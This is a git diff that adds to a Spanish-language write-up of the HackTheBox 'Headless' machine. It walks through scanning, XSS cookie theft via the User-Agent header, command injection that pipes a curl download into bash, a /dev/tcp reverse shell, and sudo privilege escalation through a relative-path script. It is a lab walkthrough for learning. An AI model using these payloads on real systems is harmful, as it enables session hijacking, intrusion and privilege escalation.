@@ -26,6 +26,7 @@ tags:
   - CVE
   - Linux
   - Enumeration
+  - Cookie Hijacking
 ---
 
 ![Headless-header](https://raw.githubusercontent.com/Gr4ykt/gr4ykt.github.io/master/assets/images/Headless-HackTheBox/Headless-header.png)
@@ -61,3 +62,208 @@ nmap -sS --min-rate 5000 -p- -Pn -n -vvv 10.10.11.8 -oN 1
 >* **-vvv:** Triple *verbose* para tener mayor información al momento mientras se realiza el escaneo.
 >* **-oN 1:** Almacena los resultados en un archivo llamado `1` en el formato nmap correspondiente, lo cual significa que este archivo entregara la información tal cual se nos fue expuesta durante y al finalizar el escaneo.
 
+[Imagen 3]
+
+Pues bien, el escaneo nos entrega dos puertos expuestos, en este caso `22 y 5000`, correspondiendo a los servicios `SSH y UPnP`. Al no tener mayor información lo mejor siempre es recurrir a `nmap` a través de un escaneo tipo `-sCV` el cual evaluara las versiones, enumerara en lo que pueda y nos entregara información un tanto más relevante sobre lo que existe detrás de estos puertos.
+
+```bash
+nmap -sCV -p22,5000 10.10.11.8 -oN version_control
+```
+
+>Parámetros utilizados: 
+>* **-sCV:** Este comando es la combinación de dos, pese a ir a algo similar, ya que ambos hacen referencia a escanear las versiones y servicios que corren en el puerto, `-sC` es un comando enfocado en lanzar una serie de scripts de nmap a través de los propios scripts de la herramienta (NSE), su objetivo es la búsqueda de versiones, identificar vulnerabilidades, entre otras pruebas útiles. Mientras que `-sV` realiza una detección de servicios y versiones exactas en el puerto especificado.
+>* **-p22,5000:** Señalamos los puertos a los que realizar el escaneo, en este caso solo son los dos puertos abiertos, en caso de no hacerlo con este parámetro, nmap realizara el escaneo en su top predeterminado de puertos, ya que nmap por detrás, si no se le señalan los puertos específicos, no realiza el escaneo en los 65535 puertos existentes, para ello se utiliza el parámetro `-p-`.
+>* **-oN:** Guardará el archivo con nombre `version_control` en el formato nmap, por tanto, conservara el formato sacado en el escaneo.
+
+
+[Imagen 4]
+
+## Escaneando la web
+### Whatweb
+Pues si bien con la información recopilada ya tenemos conocimientos más o menos a que es lo que nos estamos enfrentando, en este caso, supone un servicio `Wekezeug 2.2`, una versión de esta biblioteca de utilidades de WSGI (*Web Server Gateway Interface*) ya conocida por su [debug shell](https://www.exploit-db.com/exploits/43905), la cual adelanto, es una resolución similar, pero no igual, ya que en este caso deberemos de abordarla a través de peticiones en `BurpSuite`. Pero me estoy yendo por las ramas, la idea en este punto sería empezar a explorar la web misma, puesto que el resultado tanto en el uso de `nmap` como de `whatweb` fue exitoso y nos dio una pista de como abordar el problema.
+
+[Imagen 5]
+
+### Explorando el puerto `5000`
+Pues bien, una vez ingresamos, solo podemos visualizar un contador y no mucha más información, en este punto, todavía nos queda una manera de explorar un poco más el sitio y esta manera es a través de **fuzzing**. La idea sería explorar directorios los cuales contiene el servicio y ver si hay alguna información relevante.
+
+[Imagen 6]
+
+Pues bien, el resultado esta vez amerita algo interesante, ya que tenemos un `dashboard` el cual no tenemos acceso, nos arroja un código `500`, por tanto, está arrojando algún tipo de error. El otro directorio detectado es `support`, al cual tenemos acceso, por tanto, podríamos explorar y ver qué opciones nos va entregando nuestra auditoria.
+
+```bash
+gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 25
+```
+
+>Parámetros utilizados: 
+> * **dir:** Le decimos al programa que es una búsqueda por directorios.
+> * **-u:** La url a la cual fuzzearemos los directorios.
+> * **-w:** El diccionario a utilizar, el recomendable para fuzzera directorios medios o de inicio es el `directory-list-2.3-medium`.
+
+[Imagen 7]
+
+# Explotación
+Pues bien, no tenemos acceso al `dashboard`, por ello, debemos de explorar otras opciones, podemos empezar por el `support` porque tenemos acceso a este y podemos ver que podemos hacer. Pues, de primeras vemos lo siguiente:
+
+[Imagen 8]
+
+A este sitio, le traté de arrojar un **XSS**, caso que nos entrega el mensaje de la imagen adjunta, en este caso, como podemos ver, los está detectando de manera directa el intento de intrusión, habrá que improvisar.
+
+[Imagen 9]
+
+Aquí lo que podemos hacer es tratar de realizar bypass a través de `BurpSuite`, para que podamos capturar los campos recuperados.
+
+## XSS y Cookie Hijacking
+Primero que nada **¿Qué es el cookie hijacking?** Cookie hijacking o secuestro de sesión es un tipo de ataque informático que consiste en el robo de la cookie de un usuario para acceder a directorios del sitio no autorizados. En este caso como prueba de concepto utilizaremos el caso de la máquina, la idea seria con un `XSS` robar la cookie de sesión del administrador, y de ahí, proceder a la suplantación de cookie en el `dashboard` con una herramienta llamada `edithiscookie`, teniendo así acceso al `dashboard`.
+
+Pues bien, comenzando con `BurpSuite`, deberíamos de poder capturar la petición del panel `support` y de ahí enviar al `repeater` y tratar de enviarnos la cookie al servidor `http.server` previamente encendido. Pues bien, lo primero en este punto seria iniciar nuestro servidor para poder recibir la solicitud a lanzar a través del repeater de `BurpSuite`. Recordar previamente a lanzar el ataque, recoger una solicitud con la herramienta de `BurpSuite` para prontamente enviarla al `repeater` de esta misma, para poder jugar con la solicitud y realizar las comprobaciones necesarias que estime conveniente.
+
+```bash
+python -m http.server
+```
+
+Pues ya en este punto quedaría tratar de ejecutar el ataque, en este caso, la solicitud respondió de manera correcta inyectando el código JavaScript en el `user-agent`.
+
+> ¿Qué es el `user-agent`?
+> * Es una cadena de texto enviada en las solicitudes HTTP que identifica al cliente que realiza la petición, esta información incluye el tipo de dispositivo, sistema operativos, versiones de software.
+
+
+```html
+<script>document.location="http://10.10.14.11:8000/xss-76.js?c="+document.cookie;</script>
+```
+
+[Imagen 10]
+
+[Imagen 11]
+
+Ya aquí, lo que queda es utilizando la herramienta `edithiscookie` editar la cookie estando en el directorio `dashboard` del sitio.
+
+[Imagen 12]
+
+[Imagen 13]
+
+Ahora solo quedaría tratar de escalar en este punto a ejecución remota de comandos.
+
+## RCE to Shell
+Una vez hemos accedido a la máquina, toca explorar y trastear con lo que tenemos en este punto, ya que del gran avance que hemos tenido en este reto, por primera vez nos encontramos una parte interactiva, lo cual puede ser un indicativo del buen camino que hemos tomado hasta ahora. Pues lo primero que se nos presenta es un *dashboard administrativo*, con un botón que tiene el texto `generate report`, pues esto puede llegar a ser descriptivo, podemos darle clic y ver que ocurre.
+
+[Imagen 14]
+
+Pues bien, esto es bastante interesante, podríamos enviar esta solicitud al repeater, ver que es lo que está realizando la solicitud por detrás.
+
+[Imagen 15]
+
+[Imagen 16]
+
+Wow! Esto ya nos señala que tenemos un **RCE**, asunto bastante peligroso, pues ahora quedaría tratar de entablarnos una reverse shell, y luego continuar con la parte final de esta máquina.
+
+Primero lo primero, será crear un archivo `rev.sh` en este caso le he puesto ese nombre y contiene lo siguiente:
+
+```bash
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/10.10.14.11/5757 0>&1"
+```
+
+Luego de crear el archivo, inicie un servidor `http` como lo hicimos anteriormente, ya que a través del comando `curl` ejecutaremos nuestra reverse shell y obtener acceso a la máquina.
+
+```bash
+python -m http.server
+```
+
+[Imagen 17]
+
+
+Nos ponemos en escucha del siguiente modo `nc -lnvp 5757`.
+
+[Imagen 18]
+
+Y ejecutamos el ataque en burpsuite agregando la siguiente línea y enviando la petición:
+
+```bash
+;curl+http://IP:PORT/rev.sh|bash
+```
+
+[Imagen 19]
+
+[Imagen 20]
+
+Listo, estamos dentro de la máquina, lo que nos quedaría ahora, sería escalar privilegios, como ya tenemos acceso como un usuario, el usuario `dvir`, solo será necesario obtener el usuario `root`.
+
+### Tratamiento de la TTY
+Ahora nos queda nada más hacerle un tratamiento a la TTY y podemos seguir avanzando en la búsqueda de resolver esta máquina.
+
+```bash
+script /dev/null -c bash
+ctrl^z
+	stty raw -echo; fg
+		xterm
+		export TERM=xterm
+```
+
+[Imagen 21]
+
+# Escalación de privilegios
+Siempre que iniciamos una escalada de privilegios hay puntos claves a observar, en este caso, al escribir un `sudo -l` basto para encontrar algo interesante de lo cual aprovecharnos, recordar siempre que existen formas automatizadas de analizarlo y es a través de la herramienta linepas la cual nos recopila la información podemos realizar una recopilación de información automatizada, aunque siempre es bueno practicar el cómo podemos enumerar un sistema.
+
+[Imagen 22]
+
+[Imagen 23]
+
+
+Pues bien, el `sudo -l` nos dio un buen resultado, bastante, esto ya nos está dando una pista por donde ir, ya que podemos ejecutar como sudo un archivo `syscheck` sin tener que proporcionar contraseña, por tanto, lo suyo sería analizar el código, puesto que al buscar en GTFobins no llegue a nada en relación a este script, así que tendremos que intentar por tratar de comprender un poco que es lo que está realizando el script.
+
+```bash
+#!/usr/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+    exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+    /usr/bin/echo "Database service is not running. Starting it ..."
+    ./initdb.sh &>/dev/null
+else
+    /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+```
+
+Cabe recalcar que el ejecutar el script tampoco llegue a mucho, solo nos queda la opción de analizar, a lo cual llegue a entender cuatro puntos claves:
+1. El script realiza una verificación si el usuario que ejecuta el script es `root`.
+2. Muestra la fecha y hora de la última modificación de kernel en `/boot`.
+3. Calcula es espacio del disco desde la raíz `/`.
+4. Comprueba si el script `initdb.sh` se encuentra en ejecución, en caso de no estarlo, lo ejecuta, pero aquí está el punto importante, ya que **ejecuta el script `initdb.sh` desde la ruta actual en la cual el script `syscheck` es ejecutado**, esto quiere decir que puedo crear mi propio script `initdb.sh` y tratar de ejecutar el script.
+
+
+Por tanto, queda escribir un script, ejecutar el `syscheck`, y comprobar si esta teoría para escalar privilegios es correcta. Adjunto el `initdb.sh` y la manera utilizada para ejecutarlo.
+
+```bash
+#!/bin/bash
+/bin/bash
+```
+
+```bash
+mktemp -d
+cd tmp/ruta
+nano initdb.sh
+chmod +x initdb.sh
+sudo /usr/bin/syscheck
+```
+
+[Imagen 26]
+
+Y de esta manera estará completada la máquina.
+
+[Flag user]
+[Flag root]
